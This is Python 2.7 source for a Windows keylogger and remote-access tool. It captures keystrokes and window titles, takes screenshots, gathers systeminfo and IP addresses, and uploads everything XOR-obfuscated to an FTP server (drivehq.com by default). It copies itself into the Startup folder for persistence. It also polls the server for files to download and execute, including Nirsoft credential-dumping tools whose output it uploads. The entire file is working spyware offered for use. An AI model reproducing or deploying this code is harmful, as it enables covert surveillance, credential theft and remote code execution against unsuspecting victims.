'''
Python 2.7 implementation with some additional functionality:
-systeminfo data is uploaded when the file is executed
-all the data uploaded to FTP server is encrypted (keys_retriever.py is used to collect/decrypt the data)
-ability to take screenshot with simple kl.UploadScreenShot()
-auto-downloader so you can use keys_retriever.py to upload some file and it will be executed on the target, keys_retrieve.py allows to set few parameters to it like (persistence/execute/upload results if it's nirsoft application)
-use several ftp accounts in case if 1 is not available (drivehq.com has 25 logins/day limit so that's why there's such function)
-"keep alive" (NOOP) packet is sent each minute to the FTP
'''

import pyHook
import pythoncom
import sys, os
import ftplib, datetime
import threading, time
from Queue import Queue
import io, subprocess
from urllib2 import urlopen
import socket
import win32api
from ctypes import Structure, windll, c_uint, sizeof, byref #needed for GetIdleTime()
from random import randint

from PIL import ImageGrab, Image
import StringIO

class LASTINPUTINFO(Structure): #needed for GetIdleTime()
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]

xorMap = [235, 235, 126, 240, 203, 237, 81, 160, 9, 37, 204, 43, 190, 31, 76, 98, 53, 200, 222, 172, 184, 172, 157, 214, 128, 194, 175, 119, 254, 25, 25, 193, 109, 190, 240, 162, 184, 184, 114, 117, 57, 63, 167, 61, 104, 86, 146, 85, 114, 205, 0, 73, 162, 188, 129, 22, 67, 26, 80, 50, 190, 7, 91, 15, 56, 127, 226, 61, 172, 204, 76, 72, 40, 154, 65, 85, 8, 223, 211, 178, 149, 106, 57, 204, 236, 147, 54, 246, 59, 90, 43, 148, 9, 50, 253, 74, 143, 201, 48, 252, 236, 236, 139, 30, 124, 44, 21, 245, 179, 53, 85, 243, 230, 21, 49, 7, 239, 153, 46, 9, 1, 119, 105, 25, 71, 139, 75, 58, 43, 229, 88, 234, 226, 201, 1, 69, 16, 71, 97, 32, 195, 197, 215, 37, 219, 81, 243, 202, 181, 177, 193, 98, 179, 92, 180, 72, 219, 176, 115, 173, 16, 212, 118, 24, 204, 18, 123, 155, 197, 254, 226, 208, 80, 120, 46, 222, 152, 213, 68, 33, 153, 62, 192, 162, 16, 225, 110, 81, 65, 156, 212, 31, 26, 178, 195, 23, 141, 241, 48, 180]


def ExceptionHandler(func): #the exe won't popup "Couldn't execute keys script" but will output encrypted exception to e.mm file and "gracefully" exit
    def call(*args, **kwargs):
        try: return func(*args, **kwargs)
        except Exception as e:
            #with open("e.mm", "wb") as f:
                #f.write(XorText("Exception:\n"+str(e), xorMap)) #it's not a good idea to save it to a file if it's in the startup folder...
            print "Handled exception:\n"+str(e)
            raise SystemExit
    return call



@ExceptionHandler
def GetIdleTime():
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    return millis / 1000.0

@ExceptionHandler
def ProcessCmd(command):
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    r = proc.stdout.read() + proc.stderr.read()
    return r[:len(r)-2]

@ExceptionHandler
def XorText(text, xorMap):
    xoredText = ""
    for i, letter in enumerate(text):
        xoredText += chr(ord(text[i]) ^ (xorMap[i%len(xorMap)] ^ (xorMap[(len(text)- 1)%len(xorMap)]))) #chr(ord(letter) ^ xorMap[i%len(xorMap)])
    return xoredText

@ExceptionHandler
def FilterKey(k, text):
    if len(text) > len(k) and len(text) > 3:
        if text[len(text)-len(k):] == k and (len(k) > 1 or any(specialKey == k and specialKey == text[len(text)-1] and specialKey == text[len(text)-2] for specialKey in ["w", "s", "a", "d"])):
            return ""
    return k

@ExceptionHandler
def GetPublicIP():   
    return str(urlopen('http://ip.42.pl/raw').read())

@ExceptionHandler
def GetLocalIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 0))
        IP = s.getsockname()[0]
    except: IP = '127.0.0.1'
    finally: s.close()
    return str(IP)

class Keylogger:
    @ExceptionHandler
    def __init__(self, **kwargs):
        self.debug = kwargs.get("debug", False)
        self.postfreq = kwargs.get("postfreq", 20)
        self.q = Queue()
        self.xorMap = xorMap
        self.windowname = ""
        self.strbuff = ""
        self.secSendFile = time.clock()
        self.secKeepConAlive = time.clock()
        self.secCheckScreenCaptureRequest = time.clock()
        self.secDownloadFile = time.clock()
        self.ftpFolderName = "_" + "".join(letter for letter in ProcessCmd("echo %USERNAME%") if letter.isalnum())

    @ExceptionHandler
    def __del__(self):
        try: self.ftp.quit()
        except:
            try: self.ftp.close()
            except: pass
        try: self.hookManager.UnhookKeyboard()
        except: pass

    @ExceptionHandler 
    def StartKeyCapture(self):       
        self.hookManager = pyHook.HookManager()
        self.hookManager.KeyDown = self.OnKeypressCallback
        self.hookManager.HookKeyboard()
        pythoncom.PumpMessages()        

    @ExceptionHandler
    def OnKeypressCallback(self, press):
        if press.Ascii not in range(32,126):    
            self.q.put([FilterKey("<"+press.Key+">", self.strbuff), press.WindowName]) 
        else:
            self.q.put([FilterKey(chr(press.Ascii), self.strbuff), press.WindowName])
        return True

    @ExceptionHandler
    def CopyItselfToStartup(self):
        desired_file = ProcessCmd("echo %USERPROFILE%").replace("\\", "/") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + os.path.basename(sys.argv[0])
        if not os.path.isfile(desired_file):
            with open(os.path.basename(sys.argv[0]), "rb") as base_f, open(desired_file, "wb") as new_f:
                new_f.write(base_f.read())
                if self.debug: print "Copied itself to startup"

    @ExceptionHandler
    def FTP_Connect(self, server, port, name_list, pswd_list):
        for name, pswd in zip(name_list, pswd_list):
            try:
                self.ftp = ftplib.FTP()
                self.ftp.connect(server, port)
                self.ftp.login(name, pswd)
            except: continue
            directories = []
            self.ftp.retrlines('LIST', directories.append)
            if not any(self.ftpFolderName in d for d in directories):
                self.ftp.mkd(self.ftpFolderName)

            if self.debug: print "Connected to the ftp server (" + ", ".join([server, name, pswd]) + ")"
            return True
        raise ValueError("Couldn't connect to: " + server + " using the following credentials:\n" + "".join(u + " : " + p + "\n" for u,p in zip(name_list, pswd_list)))

    @ExceptionHandler
    def UploadSystemInfo(self):
        directories = []
        self.ftp.retrlines('LIST \\' + self.ftpFolderName, directories.append)
        if not any("_" in d for d in directories):
            self.ftp.mkd("\\"+self.ftpFolderName+"\\_")
        self.ftp.storbinary("STOR " + "\\"+ self.ftpFolderName +"\\_\\" + datetime.datetime.now().strftime("%d-%m-%Y___%H-%M") + ".mm", io.BytesIO(XorText(GetPublicIP() +"\n"+ GetLocalIP() + "\n" + ProcessCmd("systeminfo"), xorMap)))
        if self.debug: print "Systeminfo uploaded"
    
    @ExceptionHandler
    def UploadScreenShot(self, **kwargs):
        screenFolder = "vv" if kwargs.get("vidstream") == True else "ii"
        directories = []
        self.ftp.retrlines('LIST \\' + self.ftpFolderName, directories.append)
        if not any(screenFolder in d for d in directories):
            self.ftp.mkd("\\"+self.ftpFolderName + "\\" + screenFolder)            
        ss_pil = ImageGrab.grab()
        imgBuff = StringIO.StringIO()
        ss_pil.save(imgBuff, "JPEG")
        self.ftp.storbinary("STOR " + "\\"+ self.ftpFolderName + "\\" + screenFolder + "\\" + datetime.datetime.now().strftime("%d-%m-%Y___%H-%M") + ".mm", io.BytesIO(XorText(imgBuff.getvalue(), xorMap)))
        imgBuff.close()
        if self.debug: print "ScreenShot uploaded (\\" + screenFolder +")"

    @ExceptionHandler
    def IsScreenCaptureStreamRequested(self, **kwargs): #not developed it much, it requires more work to be done to be fully functional
        if kwargs.get("dircheck", False) == True:
            directories = []
            self.ftp.retrlines('LIST \\' + self.ftpFolderName, directories.append)
            if not any("vv" in d for d in directories):
                self.ftp.mkd("\\"+self.ftpFolderName+"\\vv")
                return False
        if any(f.startswith("s") for f in self.ftp.nlst("\\"+self.ftpFolderName+"\\vv")):
            return True
        return False

    @ExceptionHandler
    def IsFileDownloadAvailable(self):
        directories = []
        self.ftp.retrlines('LIST \\' + self.ftpFolderName, directories.append)
        if not any("f" in d for d in directories):
            self.ftp.mkd("\\"+self.ftpFolderName+"\\f")
        if "f.mm" in self.ftp.nlst("\\"+self.ftpFolderName+"\\f"):
            return True
        return False

    @ExceptionHandler
    def DownloadFile(self):
        if self.debug: print "DownloadFile"
        dataChunks = []
        if self.debug: print "0"
        self.ftp.retrbinary('RETR ' + "\\"+ self.ftpFolderName +"\\f\\f.mm", dataChunks.append)
        if self.debug: print 1
        fileInfo, fileData = XorText("".join(dataChunks), self.xorMap).split("###########################_____________________###############################")
        if self.debug: print 2
        destinationFileName = [v.split("=")[1] for v in fileInfo.split("\n") if "destinationFileName" in v][0]
        destinationPath = [v.split("=")[1] for v in fileInfo.split("\n") if "destinationPath" in v][0]
        destinationPath = (ProcessCmd("echo %USERPROFILE%").replace("\\", "/") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/") if destinationPath == "startup" else (ProcessCmd("echo %USERPROFILE%").replace("\\", "/") + "/" + destinationPath)
        execute = True if [v.split("=")[1] for v in fileInfo.split("\n") if "execute" in v][0] == "True" else False
        params = [v.split("=")[1] for v in fileInfo.split("\n") if "params" in v][0]
        isNirsoft = True if [v.split("=")[1] for v in fileInfo.split("\n") if "nirsoft" in v][0] == "True" else False

        desiredFile = destinationPath + destinationFileName

        if not os.path.exists(destinationPath):
            os.makedirs(destinationPath)        
        if os.path.isfile(desiredFile):
            os.remove(desiredFile)
            
        with open(desiredFile, "wb") as f:
            f.write(fileData)
            if self.debug: print "Downloaded "+ destinationFileName

        if execute:
            ProcessCmd("start \"\" \""+ desiredFile + "\"" + (" "+params if params != "none" else ""))
            if self.debug: print "Executed "+ destinationFileName
            if isNirsoft:
                nsOutput = destinationFileName.split(".")[0] + ".mm"
                for i in range(100):
                    time.sleep(0.1)
                    if os.path.isfile(nsOutput):
                        break
                else:
                    if self.debug: print "Nirsoft output not available"
                    os.remove(desiredFile)
                    return    
                    
                with open(nsOutput, "rb") as f:
                    data = XorText(f.read(),self.xorMap)
                os.remove(nsOutput)
                os.remove(desiredFile)
                if self.debug: print "Nirsoft application and output files removed"
                
                self.UploadNirsoftData(data, nsOutput)

            
        self.ftp.delete("\\"+ self.ftpFolderName +"\\f\\f.mm")
        if self.debug: print "Deleted "+ destinationFileName + " from ftp server"

    @ExceptionHandler
    def UploadNirsoftData(self, data, fileName):
        directories = []
        self.ftp.retrlines('LIST \\' + self.ftpFolderName, directories.append)
        if not any("n" in d for d in directories):
            self.ftp.mkd("\\"+self.ftpFolderName+"\\n")
        self.ftp.storbinary("STOR " + "\\"+ self.ftpFolderName +"\\n\\" + datetime.datetime.now().strftime("%d-%m-%Y___%H-%M") + ".mm", io.BytesIO(data))
        if self.debug: print "Nirsoft data uploaded"        

    @ExceptionHandler
    def Update(self):
        try:data = self.q.get(block=False)
        except:data = ["",self.windowname]

        if data[1] != self.windowname:
            self.windowname = data[1]
            self.strbuff += "\n\n["+self.windowname+"]\n"

        #print "secSendFile=" + str(self.secSendFile) + ", time.clock()=" + str(time.clock())
        
        #print data[0]
        self.strbuff += data[0]

        if (time.clock() - self.secKeepConAlive) > 60: #every 1 min
            self.secKeepConAlive = time.clock()
            if self.debug: print "Keep connection alive is going to be sent."
            self.ftp.voidcmd("NOOP")
            if self.debug: print "Keep connection alive has been sent."

        if (time.clock() - self.secSendFile) > self.postfreq*60 and self.strbuff:
            self.secSendFile = time.clock()   
            if self.debug: print "To be uploaded: " + self.strbuff + "\n"
            if self.debug: print "To be uploaded (xored): " + XorText(self.strbuff, self.xorMap) + "\n\n"
            
            b = io.BytesIO(XorText(self.strbuff, self.xorMap))
            self.ftp.storbinary("STOR " + "\\"+ self.ftpFolderName +"\\" + datetime.datetime.now().strftime("%d-%m-%Y___%H-%M") + ".mm", b)
            self.strbuff = ""

        #if (time.clock() - self.secCheckScreenCaptureRequest) > 15: #every 15 sec
            #if self.IsScreenCaptureStreamRequested(dircheck = True):
                #self.UploadScreenShot(vidstream=True)

        if (time.clock() - self.secDownloadFile) > 15: #every 15 sec
            if self.IsFileDownloadAvailable():
                time.sleep(15)
                self.DownloadFile()

        
                

def QuickSetup(**kwargs):
    kl = Keylogger(postfreq=kwargs.get("postfreq", 20), debug=kwargs.get("debug", False))            

    if kwargs.get("persistence", False): kl.CopyItselfToStartup()

    kl.FTP_Connect(kwargs.get("server", "ftp.drivehq.com"),
                   kwargs.get("port", 0),
                   kwargs.get("names",["michal", "monday", "thirdAccountUsername"]),
                   kwargs.get("passwords",["qwerty", "password2", "thirdAccountPssword"]))
    
    kl.UploadSystemInfo()
    kl.UploadScreenShot()
  
    keyCapture = threading.Thread(target=kl.StartKeyCapture)
    keyCapture.daemon = True
    keyCapture.start()
    
    while True:
        kl.Update()#a.k.a. run()           
        time.sleep(0.02)
        
        
if __name__ == "__main__":
    QuickSetup(postfreq=10, debug = True, persistence=False)